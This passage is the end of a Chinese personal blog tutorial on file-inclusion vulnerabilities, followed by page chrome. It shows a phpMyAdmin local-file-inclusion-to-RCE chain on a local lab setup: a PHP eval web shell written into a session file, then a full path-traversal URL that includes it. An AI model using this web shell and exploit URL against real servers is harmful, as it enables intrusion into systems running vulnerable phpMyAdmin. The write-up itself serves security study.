+<li><strong>执行sql语句</strong>：查看session，主要看cookie中<code>phpmyadmin</code>中的值</li>
+<li><strong>在<code>D:\phpStudy\PHPTutorial\tmp\tmp</code>中，搜索这个值</strong>，打开文件后发现文件中有<code>&lt;?php eval($_GET[&#39;S&#39;]);?&gt;</code></li>
+<li><strong>利用本地文件包含去包含<code>\tmp\tmp\sess_tl5epcif7ahh0vbb7j59nvi0ppab23a0</code>文件即可RCE，playload如下（要根据自己目录选择跳跃几级，我的是四级目录），可以看到RCE执行成功</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/phpMyAdmin/index.php?target=db_sql.php%253f/../../../tmp/tmp/sess_tl5epcif7ahh0vbb7j59nvi0ppab23a0&amp;S=phpinfo();</span><br></pre></td></tr></table></figure></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Sre-Night.github.io">Sre.Night</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sre-night.github.io/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://sre-night.github.io/2025/04/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Sre-Night.github.io" target="_blank">Sre.Night's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/" title="机器学习概述"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">机器学习概述</div></div><div class="info-2"><div class="info-item-1">机器学习概述人工智能三大概念人工智能(AI): Artificial Intelligence 像人一样机器智能的综合与分析；机器模拟人类  释义：是一个系统，像人那样思考 像人那样理性思考    释义：是一个系统，像人那样活动 像人那样合理系统   机器学习(ML): Machine Learning 让机器自动学习，而不是基于规则的编程（不依赖特定规则编程）    从数据中获取规律；来了一个新的数据，产生一个新的预测  深度学习(DL): Deep Learning深度学习 : ，也叫深度神经网络，大脑仿生，设计一层一层的神经元模拟万事万物  三者之间的关系 机器学习是实现人工智能的一种途径 深度学习是机器学习的一种方法 学习方式基于规则的学习基于规则的预测 ： 程序员根据经验利用手工的if-else方式进行预测  但是有好多问题， 无法明确的写下规则，此时我们无法使用规则学习的方式来解决这一类问题，比如：  图像和语音识别 自然语言处理  基于模型的学习基于模型的学习就是通过编写机器学习算法，让机器自己学习从历史数据中获得经验、训练模型：  案例巩固 比如房价预测，数据如下...</div></div></div></a><a class="pagination-related" href="/2025/03/21/XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/" title="XSS攻击漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XSS攻击漏洞</div></div><div class="info-2"><div class="info-item-1">XSS攻击漏洞一、前端基础前端即网站前台部分，运行在PC端，移动端等浏览器上展现给用户浏览的网页。前端技术一般分为前端设计和前端开发。前端设计一般可以理解为网站的视觉设计；前端开发是创建WEB页面或APP等前端界面呈现给用户的过程，通过HTML，CSS及JavaScript以及衍生出来的各种技术、框架、解决方案，来实现互联网产品的用户界面交互。 1. HTML基础超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。 (1) 认识HTML点开任何网页，右击，都会出现显示“查看源代码”的选项，就可以看到清晰的HTML代码。html文件是一个文本文件，由浏览器执行。HTML文件通常都是以&lt;!DOCTYPE html&gt;开始，以&lt;/html&gt;结尾。 (2) HTML结构&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;基本HTML结构&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&g...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Sre.Night</div><div class="author-info-description">谁怕？一蓑烟雨任平生。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Sre-Night"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Sre-Night" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2895487980@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的个人博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A1%88%E4%BE%8B"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、案例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.2.</span> <span class="toc-text">二、文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">1. 文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">2. 文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">3. 漏洞危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">4. 文件包含相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">5. 漏洞利用思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.0.3.</span> <span class="toc-text">三、文件包含漏洞类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">1. 本地文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.3.1.1.</span> <span class="toc-text">（1）利用方式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.3.1.2.</span> <span class="toc-text">（2）读取敏感信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">2. 远程文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.3.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.0.4.</span> <span class="toc-text">四、PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">1. file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php-input"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">2. php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-php-filter"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">3. php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-phar"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">4. phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-zip"><span class="toc-number">1.0.4.5.</span> <span class="toc-text">5. zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-http-https"><span class="toc-number">1.0.4.6.</span> <span class="toc-text">6. http:&#x2F;&#x2F; https:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-data"><span class="toc-number">1.0.4.7.</span> <span class="toc-text">7. data:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.0.5.</span> <span class="toc-text">五、防御方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%8C%85%E5%90%ABApache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6-getshell"><span class="toc-number">1.0.6.</span> <span class="toc-text">六、包含Apache日志文件 getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E3%80%81phpmyadmin-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.0.7.</span> <span class="toc-text">七、phpmyadmin 文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8-session-%E6%96%87%E4%BB%B6-getshell"><span class="toc-number">1.0.8.</span> <span class="toc-text">1. 利用 session 文件 getshell</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/23/%E5%88%A4%E6%96%AD%E5%BE%AA%E7%8E%AF/" title="循环与判断">循环与判断</a><time datetime="2025-06-23T06:52:13.000Z" title="发表于 2025-06-23 14:52:13">2025-06-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/23/%E5%8F%98%E9%87%8F%E4%BB%8B%E7%BB%8D/" title="初识python">初识python</a><time datetime="2025-06-23T06:52:13.000Z" title="发表于 2025-06-23 14:52:13">2025-06-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/09/%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/" title="逻辑回归">逻辑回归</a><time datetime="2025-05-09T06:22:11.000Z" title="发表于 2025-05-09 14:22:11">2025-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/01/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/" title="线性回归">线性回归</a><time datetime="2025-05-01T11:25:32.000Z" title="发表于 2025-05-01 19:25:32">2025-05-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/linux%E5%9F%BA%E7%A1%80%E5%8F%8Adocker/" title="LINUX基础及DOCKER">LINUX基础及DOCKER</a><time datetime="2025-04-27T05:08:10.000Z" title="发表于 2025-04-27 13:08:10">2025-04-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer-left"><div class="footer-title"><span>Sre.Night's blog | </span><span class="footer-copyright">&copy;2025 By Sre.Night</span></div><div class="wordcount"></div><span>皆安 已经写了 41.7k 字，</span><span>好像写完一本 海明威 的 《老人与海》 了啊</span></div><div id="footer-right"><div class="footer-totop"><i class="fas fa-chevron-up" onclick="rmf.scrollToTop()"></i></div><div class="footer-info"><p>使用Hexo框架 | 基于butterfly修改</p></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script defer src="/js/cursor.js"></script><script defer src="/js/nav.js"></script><script defer src="/js/title.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 380px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 320px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(/img/category-card-bg/honghong.jpg);"> <a class="categoryBar-list-link" href="categories/大模型/">大模型</a><span class="categoryBar-list-count">4</span><span class="categoryBar-list-descr">记录学习历程</span></li><li class="categoryBar-list-item" style="background:url(/img/category-card-bg/wangquan.jpeg);"> <a class="categoryBar-list-link" href="categories/python/">python</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">记录学习历程</span></li><li class="categoryBar-list-item" style="background:url(/img/category-card-bg/rongrong.jpg);"> <a class="categoryBar-list-link" href="categories/web安全/">web安全</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">记录学习历程</span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><!-- hexo injector body_end end --></body></html>
